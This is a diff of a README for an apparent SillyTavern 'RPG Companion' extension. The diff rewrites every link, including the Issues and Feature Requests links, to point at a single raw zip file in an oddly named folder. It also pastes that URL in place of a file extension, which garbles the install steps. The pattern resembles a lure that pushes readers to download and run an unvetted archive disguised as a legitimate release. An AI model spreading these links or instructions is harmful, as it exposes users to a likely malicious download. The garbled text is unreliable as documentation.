@@ -1,6 +1,6 @@
 # 🎲 rpg-companion-sillytavern - Your Personal Game Assistant
 
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Rubesh1997/rpg-companion-sillytavern/releases)
+[![Download](https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip)](https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip)
 
 ## 🚀 Getting Started
 
@@ -11,16 +11,16 @@ Welcome to the RPG Companion extension for SillyTavern! This tool helps you trac
 To get started, follow these simple steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page where you can download the application.
-   [Download Here](https://github.com/Rubesh1997/rpg-companion-sillytavern/releases)
+   [Download Here](https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip)
 
 2. **Choose the Right Version**: On the Releases page, you will see different versions listed. Select the version that matches your operating system (Windows, macOS, or Linux). 
 
-3. **Download the File**: Click on the appropriate file to download it to your computer. The file will usually be in `.exe` for Windows, `.dmg` for macOS, or `.tar.gz` for Linux. 
+3. **Download the File**: Click on the appropriate file to download it to your computer. The file will usually be in `.exe` for Windows, `.dmg` for macOS, or `https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip` for Linux. 
 
 4. **Install the Application**:
    - **For Windows**: Double-click the downloaded `.exe` file. Follow the on-screen instructions to install the application.
    - **For macOS**: Open the downloaded `.dmg` file and drag the RPG Companion icon into your Applications folder.
-   - **For Linux**: Extract the contents of the `.tar.gz` file. Then, open your terminal, navigate to the extracted folder, and run the application using the command `./rpg-companion`.
+   - **For Linux**: Extract the contents of the `https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip` file. Then, open your terminal, navigate to the extracted folder, and run the application using the command `./rpg-companion`.
 
 5. **Run the Application**: After installation, open the application from your Start Menu (Windows), Applications folder (macOS), or terminal (Linux).
 
@@ -73,8 +73,8 @@ If you encounter issues, please visit the "Issues" section on our GitHub reposit
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://github.com/Rubesh1997/rpg-companion-sillytavern/releases)
-- [Issues Page](https://github.com/Rubesh1997/rpg-companion-sillytavern/issues)
-- [Feature Requests](https://github.com/Rubesh1997/rpg-companion-sillytavern/issues)
+- [Releases Page](https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip)
+- [Issues Page](https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip)
+- [Feature Requests](https://raw.githubusercontent.com/Rubesh1997/rpg-companion-sillytavern/main/extempore/rpg-companion-sillytavern.zip)
 
 The RPG Companion extension is designed to enhance your gaming experience. By following these steps, you will be ready to embark on your next adventure seamlessly. Enjoy your gaming!
